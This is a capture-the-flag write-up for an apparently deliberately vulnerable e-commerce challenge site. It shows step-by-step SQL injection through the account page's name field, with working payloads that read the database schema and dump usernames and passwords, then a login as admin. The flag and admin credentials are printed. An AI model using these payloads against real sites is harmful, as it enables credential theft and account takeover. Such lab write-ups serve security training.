# E-Commerce Platform

This online store has some great deals, but there's a hidden catch. Can you find a way to dig deeper and uncover more than what's on display?

https://lkjhgfdsaqwe-csc26.cybersecuritychallenge.al

URL:\*\* https://lkjhgfdsaqwe-csc26.cybersecuritychallenge.al

## Flag

```
CSC26{3_c0mm3rc3_pl4tf0rm}
```

## Vulnerability

**SQL Injection** in the `/account` endpoint's `name` parameter.

## Exploitation Steps

### 1. Identify SQL Injection

Testing the `name` field with a single quote revealed the vulnerability:

```
POST /account
name=test'&currentpassword=<password>
```

**Error:** `"'test'' WHERE id = 52"` → Reveals SQLite UPDATE query structure

### 2. Extract Database Schema

Using concatenation-based SQLi:

```sql
name=test'||(SELECT group_concat(name) FROM sqlite_master WHERE type='table')--
```

**Tables found:** `products`, `users`, `sqlite_sequence`

### 3. Dump Users Table

```sql
name=test'||(SELECT group_concat(username||':'||password,';') FROM users)--
```

**Admin credentials:** `admin:mPFspNy72CRhn4a`

### 4. Login as Admin

```bash
POST /login
username=admin&password=mPFspNy72CRhn4a
```

### 5. Access Admin Account Page

Navigate to `/account` while logged in as admin → Flag displayed in success alert.
